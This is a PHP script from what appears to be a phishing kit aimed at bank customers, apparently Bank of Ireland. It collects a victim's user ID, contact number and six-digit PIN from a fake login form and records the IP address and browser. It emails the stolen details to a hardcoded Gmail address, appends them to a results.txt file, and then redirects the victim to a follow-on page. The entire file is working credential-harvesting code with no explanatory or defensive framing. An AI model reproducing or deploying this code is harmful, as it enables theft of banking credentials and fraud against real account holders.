<?
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------1 LOGINDetails-------------------\n";
$message .= "userid		: ".$_POST['userid']."\n";
$message .= "contactno	: ".$_POST['4DC']."\n";
$message .= "6D pin		: ".$_POST['P1']."-".$_POST['P2']."-".$_POST['P3']."-".$_POST['P4']."-".$_POST['P5']."-".$_POST['P6']."\n";
$message .= "--------created by medpage[679849675]-------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------boiRESULTS-----------------------\n";
$send = "ladybee9020@gmail.com";
$subject = "boiRESULTS 1 ".$_POST['results'];
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message);
}
$fp = fopen('results.txt', 'a');
fwrite($fp, $message);
fclose($fp);
?>
<script>

    window.top.location.href = "indexxxx.html";

</script>